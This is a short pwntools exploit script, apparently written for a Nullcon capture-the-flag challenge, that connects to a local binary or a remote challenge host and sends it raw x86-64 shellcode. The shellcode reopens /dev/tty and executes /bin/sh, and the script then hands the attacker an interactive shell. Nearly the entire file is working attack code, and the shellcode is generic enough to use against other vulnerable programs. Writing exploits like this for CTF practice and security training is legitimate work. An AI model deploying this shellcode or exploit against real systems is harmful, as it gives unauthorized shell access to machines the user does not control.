from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "pwn1.ctf.nullcon.net"
PORT = 5002 

shellcode = "\xB0\x03\x31\xFF\x0F\x05\xB0\x03\xBF\x01\x00\x00\x00\x0F\x05\xB0\x03\xBF\x02\x00\x00\x00\x0F\x05\xB0\x02\x48\x8B\x3D\x2A\x00\x00\x00\x48\xC7\xC6\x02\x00\x00\x00\x48\x31\xD2\x0F\x05\x48\x31\xD2\x52\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x52\x57\x48\x89\xE6\x48\x8D\x42\x3B\x0F\x05\x90"
shellcode += "/dev/tty\x00"

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	conn.sendline(shellcode)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
